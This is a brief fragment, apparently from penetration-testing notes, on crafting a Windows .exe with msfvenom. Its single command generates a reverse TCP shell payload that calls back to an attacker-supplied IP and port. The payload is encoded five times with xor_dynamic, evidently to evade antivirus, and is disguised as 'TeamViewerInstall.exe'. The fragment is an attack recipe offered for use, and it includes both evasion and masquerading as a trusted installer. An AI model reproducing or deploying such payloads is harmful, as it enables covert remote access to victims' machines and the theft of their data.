...
### crafting a .exe file with Shikata Ga Nai encoder and XOR_dynamic
...
We can use also with XOR dynamic:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -e x64/xor_dynamic -i 5 -o /root/Desktop/TeamViewerInstall.exe 
```
